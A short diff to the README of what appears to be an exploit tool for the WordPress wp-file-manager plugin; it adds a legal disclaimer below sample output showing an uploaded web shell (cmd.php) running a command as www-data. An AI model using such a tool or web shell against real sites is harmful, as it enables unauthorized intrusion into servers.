@@ -15,3 +15,9 @@ optional arguments:
 [*]Shell Uploaded https://localhost/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id[*]
 Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+
+Legal disclaimer
+---
+
+Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
